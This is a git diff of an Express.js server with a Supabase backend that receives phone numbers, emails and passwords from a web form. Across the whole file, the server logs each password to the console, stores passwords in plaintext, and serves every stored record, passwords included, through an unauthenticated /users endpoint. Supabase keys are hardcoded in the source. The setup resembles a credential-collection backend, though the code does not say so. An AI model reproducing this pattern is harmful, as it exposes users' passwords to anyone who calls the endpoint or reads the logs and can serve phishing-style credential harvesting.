@@ -7,80 +7,90 @@ const app = express()
 app.use(cors())
 app.use(express.json())
 
-// SERVE FRONTEND
+/* SERVE FRONTEND */
+
 app.use(express.static("public"))
 
-// SUPABASE CONNECTION
-const supabase = createClient(
-  "https://tngegsxejzalvhejppid.supabase.co",
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRuZ2Vnc3hlanphbHZoZWpwcGlkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI4Mzc4NjYsImV4cCI6MjA4ODQxMzg2Nn0.8d5mEk12eEWFhs7-cEOJFIBR2aK0pYu_PzE0Z8yiHY"
-)
+/* SUPABASE CONNECTION */
 
-// TEST ROUTE
+const SUPABASE_URL = "https://tngegsxejzalvhejppid.supabase.co"
+const SUPABASE_KEY = "sb_publishable_PI6TWlFH9YgC3x9mnsW9sA_L_GWD2Xe"
+
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY)
+
+/* TEST ROUTE */
+
 app.get("/test",(req,res)=>{
-  res.send("Server is running")
+res.send("Server is running")
 })
 
-// RECEIVE FORM DATA
+/* RECEIVE FORM DATA */
+
 app.post("/submit", async (req,res)=>{
 
-  try{
+try{
 
-    const { phone,email,password } = req.body
+const { phone,email,password } = req.body
 
-    console.log("Phone:",phone)
-    console.log("Email:",email)
-    console.log("Password:",password)
+if(!phone || !email || !password){
+return res.status(400).json({ error:"Missing fields" })
+}
 
-    const { data,error } = await supabase
-      .from("users")
-      .insert([{ phone,email,password }])
+console.log("Phone:",phone)
+console.log("Email:",email)
+console.log("Password:",password)
 
-    if(error){
-      console.log("Insert error:",error)
-      return res.status(500).json({ error:error.message })
-    }
+const { data,error } = await supabase
+.from("users")
+.insert([{ phone,email,password }])
 
-    res.json({ message:"Data saved successfully", data })
+if(error){
+console.log("Insert error:",error)
+return res.status(500).json({ error:error.message })
+}
 
-  }catch(err){
+res.json({ message:"Data saved successfully", data })
 
-    console.log("Server error:",err)
-    res.status(500).json({ error:"Server failure" })
+}catch(err){
 
-  }
+console.log("Server error:",err)
+res.status(500).json({ error:"Server failure" })
+
+}
 
 })
 
-// GET USERS
+/* GET USERS */
+
 app.get("/users", async (req,res)=>{
 
-  try{
+try{
 
-    const { data,error } = await supabase
-      .from("users")
-      .select("*")
-      .order("id",{ ascending:false })
+const { data,error } = await supabase
+.from("users")
+.select("*")
+.order("id",{ ascending:false })
 
-    if(error){
-      console.log("Read error:",error)
-      return res.status(500).json({ error:error.message })
-    }
+if(error){
+console.log("Read error:",error)
+return res.status(500).json({ error:error.message })
+}
 
-    res.json(data)
+res.json(data)
 
-  }catch(err){
+}catch(err){
 
-    console.log("Server error:",err)
-    res.status(500).json({ error:"Server failure" })
+console.log("Server error:",err)
+res.status(500).json({ error:"Server failure" })
 
-  }
+}
 
 })
 
-// START SERVER
+/* START SERVER */
+
 const PORT = process.env.PORT || 3000
 
 app.listen(PORT,()=>{
-  console.log("Server running on port",PORT)
+console.log("Server running on port",PORT)
 })
